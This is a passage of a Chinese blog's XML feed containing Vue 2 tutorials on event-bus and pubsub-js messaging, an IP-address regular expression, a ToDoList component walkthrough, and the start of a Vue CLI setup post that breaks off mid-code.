&#125;,</span><br></pre></td></tr></table></figure><p>2.给数据传输方，也就是我们的MyItem加入自定义事件的$emit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">   handler(id)&#123;</span><br><span class="line">     this.$bus.$emit(&#x27;checkTodo&#x27;,id)    </span><br><span class="line">   &#125;,</span><br><span class="line">   handleDelete(id)&#123;</span><br><span class="line">     if(confirm(&#x27;确定删除吗？&#x27;))&#123;</span><br><span class="line">       //通知App删除</span><br><span class="line">       this.$bus.$emit(&#x27;deleteTodo&#x27;,id)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>3.给数据的接收方，也就是我们的App组件加入$on</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    this.$bus.$on(&#x27;checkTodo&#x27;,this.checktodo)</span><br><span class="line">    this.$bus.$on(&#x27;deleteTodo&#x27;,this.deletetodo)</span><br><span class="line">  &#125;,</span><br><span class="line">  // 解绑</span><br><span class="line">  beforeDestroy()&#123;</span><br><span class="line">    this.$bus.$off(&#x27;checkTodo&#x27;)</span><br><span class="line">    this.$bus.$off(&#x27;deleteTodo&#x27;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这样我们的非亲组件通信就完成了！</p><h2 id="四-消息订阅与发布"><a href="#四-消息订阅与发布" class="headerlink" title="四. 消息订阅与发布"></a>四. 消息订阅与发布</h2><p>消息订阅与发布需要一个库 =》pubsub</p><p>我们使用 <code>npm i pubsub-js</code>实现库的安装</p><h3 id="1-发布消息："><a href="#1-发布消息：" class="headerlink" title="1.发布消息："></a>1.发布消息：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//发布消息</span><br><span class="line">import pubsub from &#x27;pubsub-js&#x27; //引入pubsub库</span><br><span class="line">//pubsub.publish实现消息的发布</span><br><span class="line">methods: &#123;</span><br><span class="line">    sendStudentName()&#123;</span><br><span class="line">      pubsub.publish(&#x27;hello&#x27;,666)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h3 id="2-接收消息："><a href="#2-接收消息：" class="headerlink" title="2.接收消息："></a>2.接收消息：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//引入库</span><br><span class="line">import pubsub from &#x27;pubsub-js&#x27;</span><br><span class="line">//先写方法</span><br><span class="line">methods: &#123;</span><br><span class="line">    demo(msgName,data)&#123;</span><br><span class="line">      console.log(&#x27;hello消息收到了&#x27;+data,this);//这样子写的this就是vc</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">//调用实现方法</span><br><span class="line">mounted() &#123;</span><br><span class="line">   this.pubid = pubsub.subscribe(&#x27;hello&#x27;,(msgname,data)=&gt;&#123;//a是消息名=》hello,b是传过来的参数</span><br><span class="line">      // 这里函数里面的this是undefined，所以需要使用箭头函数</span><br><span class="line">      this.pubid = pubsub.subscribe(&#x27;hello&#x27;,this.demo)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">//取消订阅</span><br><span class="line"> beforeDestroy() &#123;</span><br><span class="line">    // this.$bus.$off(&#x27;hello&#x27;)</span><br><span class="line">    pubsub.unsubscribe(this.pubid)//this.pubid拿到id，取消订阅</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h3 id="3-修改todolist案例"><a href="#3-修改todolist案例" class="headerlink" title="3.修改todolist案例"></a>3.修改todolist案例</h3><p>这里与事件总线的写法有类似之处，就不赘述了</p><p>发布消息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">    handler(id)&#123;</span><br><span class="line">      pubsub.publish(&#x27;checkTodo&#x27;,id)</span><br><span class="line">    &#125;,</span><br><span class="line">    handleDelete(id)&#123;</span><br><span class="line">      if(confirm(&#x27;确定删除吗？&#x27;))&#123;</span><br><span class="line">        //通知App删除</span><br><span class="line">        pubsub.publish(&#x27;deleteTodo&#x27;,id)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收消息和取消订阅：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    this.pubid1 = pubsub.subscribe(&quot;deleteTodo&quot;, this.deletetodo);</span><br><span class="line">    this.pubid2 = pubsub.subscribe(&quot;checkTodo&quot;, this.checktodo);</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeDestroy() &#123;</span><br><span class="line">    pubsub.unsubscribe(&quot;pubid1&quot;);</span><br><span class="line">    PubSub.unsubscribe(&quot;pubid2&quot;);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>脚手架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2022/04/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/04/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="1-常用的正则表达式"><a href="#1-常用的正则表达式" class="headerlink" title="1.常用的正则表达式"></a>1.常用的正则表达式</h2><p><img src="https://s2.loli.net/2022/04/17/2C6lbuqxSWmHhoa.png" alt="常用正则表达式.png"></p><p>这些都是常用的正则表达式的值</p><h2 id="2-下面是一个实例"><a href="#2-下面是一个实例" class="headerlink" title="2.下面是一个实例"></a>2.下面是一个实例</h2><p><strong>这个是匹配0-255的表达式</strong>：[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5]，我们来分析一下</p><p>首先明确 |  起到分割的作用，也就是一个分割一种情况</p><p>第一个 | 之前是一个一位数，匹配[0,9]之间的所有数字</p><p>第二个 | [1-9] [0-9] 是代表的一个两位数，匹配10-99的所有数字</p><p>第三个 | 1 [0-9] {2}，其中1代表第一个字符需要是1，{2}是代表[0-9]要匹配两次，也就是这里匹配了100-199的所有数字</p><p>第四个 | 25 [0-5] ，25和之前一样代表前两位是25 ，第三位就是[0-5]之间的数</p><p><strong>tips：</strong>我们可以看出来正则表达式需要我们对于字符串先进行分析，对于不同的匹配情况，使用 | 进行逻辑运算</p><p>那么我们对于这个做一个拓展，我们重复三次这样子的匹配</p><p>首先把上面的字符串打包：([0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ . </p><p> 又为了防止我们的数据出现 () ，我们将其变成 (?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ . </p><p>打包完成之后将这个重复三次匹配：(?:(?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ .){3}</p><p>我们再进行这样的一次匹配，返现就可以得到我们的 <code>ip</code> 地址匹配</p><p>^(?:(?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ .){3}(?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])$</p><p>需要注意的是需要对匹配串进行^ 和 $  的打包。 </p>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ToDoList案例</title>
    <link href="/2022/04/09/ToDoList%20%E6%A1%88%E4%BE%8B/"/>
    <url>/2022/04/09/ToDoList%20%E6%A1%88%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="ToDoList-案例"><a href="#ToDoList-案例" class="headerlink" title="ToDoList 案例"></a><code>ToDoList</code> 案例</h1><p>我们在编码前端工程的时候，需要按照一定的顺序</p><p><img src="https://s2.loli.net/2022/04/09/BfNzG8mHwxLYsrj.png" alt="案例分析.png"></p><p>对于我们的<code>todolist</code>案例，我们首先第一步是根据功能和构造拆分组件（根据图中所示，不再赘述），然后实现静态组件</p><h2 id="part-one-静态组件"><a href="#part-one-静态组件" class="headerlink" title="part one . 静态组件"></a>part one . 静态组件</h2><p>我们拆分完组件之后就在脚手架中建立我们的components下的组件，然后父组件引入子组件，<code>App</code>组件再引入非子组件</p><p>我们得到的结构应该是这样的：</p><p><img src="https://s2.loli.net/2022/04/09/CRky95aDzstZVY7.png" alt="组件结构.png"></p><p>其中<code>MyItem</code>组件是<code>MyList</code>组件的子组件，所以需要在<code>MyList</code>组件中引入和注册我们的<code>MyItem</code>组件</p><p>写上HTML和CSS代码后，我们得到了静态页面和我们的Vue结构</p><p><img src="https://s2.loli.net/2022/04/09/Bbc7TeFWnkzs18I.png" alt="静态页面和Vue结构.png"></p><h2 id="part-two-展示动态数据"><a href="#part-two-展示动态数据" class="headerlink" title="part two.展示动态数据"></a>part two.展示动态数据</h2><h3 id="我们需要关注的第一个问题是，数据类型是什么？"><a href="#我们需要关注的第一个问题是，数据类型是什么？" class="headerlink" title="我们需要关注的第一个问题是，数据类型是什么？"></a><em><strong>我们需要关注的第一个问题是，数据类型是什么？</strong></em></h3><p>首先我们可以确定这个数据是要放在<code>mylist</code>文件中的，这里我们使用的是一个对象数组，因为数组可以方便遍历，而对象又可以体现数据的各个特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">return &#123;</span><br><span class="line">      todos:[//返回一个对象数组</span><br><span class="line">      &#123;id:&#x27;001&#x27;,title:&#x27;吃饭&#x27;,done:true&#125;,//对象中的key使用字符串最好，因为number有界限</span><br><span class="line">      &#123;id:&#x27;002&#x27;,title:&#x27;睡觉&#x27;,done:false&#125;,</span><br><span class="line">      &#123;id:&#x27;003&#x27;,title:&#x27;打代码&#x27;,done:true&#125;,</span><br><span class="line">    ]&#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>然后在上面的组件标签中循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;MyItem v-for=&quot;todoobj in todos&quot; :key=&quot;todoobj.id&quot; :todo=&#x27;todoobj&#x27;/&gt;</span><br></pre></td></tr></table></figure><p>同时我们也应该想到需要与<code>MyItem</code>文件进行交互，所以放入一个props</p><p>在<code>MyItem</code>进行props的接收，并使用这些数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- :checked綁定小技巧，使用数据绑定进行勾选的判断 --&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; :checked=&#x27;todo.done&#x27;/&gt;</span><br><span class="line">&lt;span&gt;&#123;&#123;todo.title&#125;&#125;&lt;/span&gt;</span><br><span class="line">//</span><br><span class="line">props:[&#x27;todo&#x27;]</span><br></pre></td></tr></table></figure><p>这样我们在list部分的数据展示就完成了一部分了</p><h3 id="然后是我们的第二个问题：如何完成todos的添加"><a href="#然后是我们的第二个问题：如何完成todos的添加" class="headerlink" title="然后是我们的第二个问题：如何完成todos的添加"></a><em><strong>然后是我们的第二个问题：如何完成<code>todos</code>的添加</strong></em></h3><p>我们的输入框在<code>Myheader</code>中，但是我们的<code>todos</code>数组在<code>Mylist</code>中，这就需要我们的兄弟组件间传值，但是我们如果还没有学习：消息订阅，全局事件总线等</p><p>我们使用一个绕一点的方式实现：（如图），将数据交给父组件，让父组件实现中介的功能</p><p><img src="!%5B%E5%85%84%E5%BC%9F%E4%BC%A0%E5%80%BC%E9%97%B4%E6%8E%A5%E5%AE%9E%E7%8E%B0.png%5D(https://s2.loli.net/2022/04/09/He3O2BnwJjzrYTE.png" alt="兄弟传值间接实现"></p><p>第一件事情：先把<code>todos</code>放在<code>App</code>中，通过props再传给list</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;MyList :todos=&#x27;todos&#x27;/&gt;</span><br><span class="line">//</span><br><span class="line">data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      todos: [</span><br><span class="line">        &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;, //对象中的key使用字符串最好，因为number有界限</span><br><span class="line">        &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;,</span><br><span class="line">        &#123; id: &quot;003&quot;, title: &quot;打代码&quot;, done: true &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>第二件事情：在<code>App</code>中创建一个给<code>todos</code>添加对象的函数，传给<code>Myheader</code>，然后<code>Myheader</code>使用<code>App</code>传过来的函数，实现input与<code>todos</code>之间的传值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//input框</span><br><span class="line">&lt;input</span><br><span class="line">      type=&quot;text&quot;</span><br><span class="line">      placeholder=&quot;请输入你的任务名称，按回车键确认&quot;</span><br><span class="line">      v-model=&quot;title&quot;</span><br><span class="line">      @keyup.enter=&quot;addtodos&quot;</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">//script部分</span><br><span class="line">    data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      title: &quot;&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  //添加todo的函数</span><br><span class="line">  methods: &#123;</span><br><span class="line">    addtodos() &#123;</span><br><span class="line">      // 判断输入格式，trim消除空格</span><br><span class="line">      if (!this.title.trim()) return alert(&quot;请输入事项&quot;);</span><br><span class="line">      const t = &#123; id: nanoid(), title: this.title, done: false &#125;;//nanoid()是一个库，生成唯一的id</span><br><span class="line">      this.receive(t);</span><br><span class="line">      this.title = &quot;&quot;; //输入完成后清空</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  props: [&quot;receive&quot;],</span><br></pre></td></tr></table></figure><p>第三件事情：<code>App</code>接收到<code>MyHeader</code>传入的数据，并传给<code>todos</code>数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//App组件中的receive</span><br><span class="line">methods: &#123;</span><br><span class="line">   receive(todoobj)&#123;</span><br><span class="line">     this.todos.unshift(todoobj);//拿到todoobj并传入todos数组</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>这样我们就实现了兄弟组件之间的传值。</p><p><em><strong>第三个需求，我们实现勾选和取消勾选</strong></em></p><p>首先在<code>MyItem</code>的勾选框当中绑定点击或者改变(change)事件，通过该事件拿到该todo的id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//MyItem组件</span><br><span class="line">@change=&quot;handler(todo.id)&quot;</span><br><span class="line">//</span><br><span class="line"> methods: &#123;</span><br><span class="line">    handler(id)&#123;</span><br><span class="line">      this.checktodo(id);//传回checktodo也就是返回上级</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>但是我们的<code>todos</code>对象在<code>App</code>组件当中,所以我们如果要操作todos需要回到App组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//App组件</span><br><span class="line">checktodo(id)&#123;</span><br><span class="line">      this.todos.forEach(todo =&gt; &#123;//循环遍历todos</span><br><span class="line">        if(todo.id==id)&#123;</span><br><span class="line">          todo.done=!todo.done;实现取反</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过props将<code>checktodo</code>传给<code>MyList</code>然后<code>MyList</code>再传给<code>MyItem</code>实现<code>checktodo</code>的传参</p><p>tips:第二种方法：但是不建议</p><p>我们只在<code>MyItem</code>的input里面修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;checkbox&quot; v-model=&#x27;todo.done&#x27;/&gt;</span><br></pre></td></tr></table></figure><p>双向绑定<code>todo.done</code>,这样我们便是改变了props中的数据，但是有深度的改变的（参考深度监视）,所以不会报错。</p><h3 id="第四个需求，删除效果"><a href="#第四个需求，删除效果" class="headerlink" title="第四个需求，删除效果"></a><em><strong>第四个需求，删除效果</strong></em></h3><p>这个需求完成起来比较简单 =&gt; 思路就是 </p><p>1.在MyItem中拿到id</p><p>2.在App中拿到todos并设置过滤器，重新赋值todos</p><p>3.将App中拿到的函数传给MyList再传给MyItem，然后MyItem传参</p><p>关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//App中</span><br><span class="line">deletetodo(id)&#123;//重新赋值</span><br><span class="line">      this.todos = this.todos.filter(todo =&gt; todo.id!==id)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//MyItem中</span><br><span class="line">handleDelete(id)&#123;</span><br><span class="line">      if(confirm(&#x27;确定删除吗？&#x27;))&#123;</span><br><span class="line">        //通知App删除</span><br><span class="line">        this.deletetodo(id);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h3 id="第五个需求，计算完成事项个数"><a href="#第五个需求，计算完成事项个数" class="headerlink" title="第五个需求，计算完成事项个数"></a><em><strong>第五个需求，计算完成事项个数</strong></em></h3><p>我们需要使用计算属性计算 done为true的 todo有多少个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;已完成&#123;&#123; doneTotal &#125;&#125;&lt;/span&gt; / 全部&#123;&#123; todos.length &#125;&#125;</span><br></pre></td></tr></table></figure><p>这里主要介绍一个数组里面常用的reduce方法，过滤返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//计算属性中的函数</span><br><span class="line">return this.todos.reduce((pre, current) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">​    //第一次调用pre为0，第二次pre为第一次的返回值，current是每一次todo项</span><br><span class="line"></span><br><span class="line">​    return pre + (current.done ? 1 : 0); //最后一次的返回值是reduce的返回值，之前的都是返回作为pre的值</span><br><span class="line"></span><br><span class="line">   &#125;, 0)</span><br></pre></td></tr></table></figure><p>或者也可以使用filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return this.todos.filter((todo)=&gt; todo.done===true).length//改变原数组报错</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="第六个需求，实现全部完成打钩和清空"><a href="#第六个需求，实现全部完成打钩和清空" class="headerlink" title="第六个需求，实现全部完成打钩和清空"></a><em>第六个需求，实现全部完成打钩</em>和清空</h3><p>一 . 打钩这里有两个方法</p><p>第一个方法：</p><p>在最后的勾选框里面绑定点击事件，获取他的checked值，然后回到App用一个函数操作todos，函数的值通过MyFooter里面传参得到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//MyFooter</span><br><span class="line">&lt;input type=&quot;checkbox&quot; :checked=&quot;isAll&quot; @change=&quot;checkAll&quot; /&gt; </span><br><span class="line">//计算属性</span><br><span class="line">isAll()&#123;</span><br><span class="line">      return this.doneTotal === this.total &amp;&amp; this.total&gt;0</span><br><span class="line">    &#125;</span><br><span class="line"> //方法</span><br><span class="line">    methods: &#123;</span><br><span class="line">    checkAll(e) &#123;</span><br><span class="line">      // 这里的e.target拿到最后的勾选框</span><br><span class="line">       console.log(e.target.checked);</span><br><span class="line">       this.checkAllTodo(e.target.checked);</span><br><span class="line">     &#125;,</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//App组件</span><br><span class="line">checkAllTodo(done) &#123;</span><br><span class="line">      //全选函数</span><br><span class="line">      this.todos.forEach((todo) =&gt; &#123;</span><br><span class="line">        todo.done = done;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>第二种方法：</p><p>通过v-model双向绑定，计算属性的拓展形式，set修改时，就可以调用<code>checkAlltodo</code>，而且传参就是value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;checkbox&quot; v-model=&quot;isAll&quot; /&gt;</span><br><span class="line">//</span><br><span class="line">isAll: &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        return this.doneTotal === this.total &amp;&amp; this.total &gt; 0;</span><br><span class="line">      &#125;,</span><br><span class="line">      set(value) &#123;</span><br><span class="line">        this.checkAllTodo(value);//checked被修改了调用，这里因为是isAll的计算属性，所以直接拿到value</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>二 . 全部清空</p><p>实现全部清空，就给全部清空按钮绑定click事件，同理操作todos数组的方法交给App，MyFooter只负责传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//App中的方法</span><br><span class="line">clearAllTodo() &#123;</span><br><span class="line">      this.todos = this.todos.filter((todo) =&gt; &#123;//进行遍历，如果return 结果为true则留下来</span><br><span class="line">         return !todo.done;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">//props转到MyFooter中调用</span><br><span class="line"> clear()&#123;//clear为绑定的点击事件</span><br><span class="line">      this.clearAllTodo();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="part-three-总结"><a href="#part-three-总结" class="headerlink" title="part three . 总结"></a>part three . 总结</h2><p>1.我们首先接触的便是组件化的编码流程，将组件根据功能点拆分，</p><p>2.实现动态组件：考虑好数据存放的位置，比如todos这个数组因为很多组件都会用到，那么我们就放在我们的最大组件App当中<strong>（状态提升）</strong>，如果对于一些只有单个组价在使用的数据，那么放在这个组件当中就可以了。</p><p>3.props在我们这个案例中实现了组件间交流的作用，但是对于子组件给父组件传值，我们需要父组件先给子组件一个函数，子组件通过函数传参。</p><p>4.使用v-model时，注意双向绑定的含义，绑定的值可以是计算属性，函数中会用到的值（总的来说就是你需要获取他的变化和他的变化要影响你的数据展示）。最好绑定的值不是props中 的，因为props中会有浅层次的数据监视。</p><p>5.几个数组方法，reduce，filter，unshift，简写形式，如何简化代码，我们需要思考，不能一上来就是一堆代码，很不好看，也很麻烦。</p>]]></content>
    
    
    
    <tags>
      
      <tag>vue脚手架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vue脚手架</title>
    <link href="/2022/03/28/vue%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
    <url>/2022/03/28/vue%E8%84%9A%E6%89%8B%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<p>在vue编程当中我们因为单文件组件的引入，需要在一个框架当中执行，而vue团队便给我们提供了这样一个编译流——vuecli</p><span id="more"></span><h1 id="vue脚手架"><a href="#vue脚手架" class="headerlink" title="vue脚手架"></a>vue脚手架</h1><h2 id="一-脚手架的安装"><a href="#一-脚手架的安装" class="headerlink" title="一 . 脚手架的安装"></a>一 . 脚手架的安装</h2><p><img src="https://s2.loli.net/2022/03/28/tKa4LpgbRBows9Q.png" alt="安装脚手架.png"></p><p>为了万无一失，我们都先配置一下淘宝镜像，然后<code>npm install</code>,我们再重新打开cmd，<code>cd Desktop</code>到我们的桌面，输入<code>mkdir demo</code>如果桌面上出现了demo文件夹那么说明切换成功，就可以执行<code>vue create  文件名</code>了</p><h2 id="二-分析脚手架"><a href="#二-分析脚手架" class="headerlink" title="二 . 分析脚手架"></a>二 . 分析脚手架</h2><p>配置文件我们先不谈</p><p>首先是main.js里面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 文件是整个项目的入口文件</span><br><span class="line">// 引入Vue</span><br><span class="line">import Vue from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip=false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &quot;#root&quot;,</span><br><span class="line">    //render实现App的载入</span><br><span class="line">    render: h =&gt; h(App),</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>main是项目的入口文件，与一般的main不同，我们要先引入vue，然后是使用render</p><p>其他的.vue文件与之前的差别不大，我们直接将之前写的拖入注意<App>要放在components外面管理里面的小弟</p><p>但是index的html文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 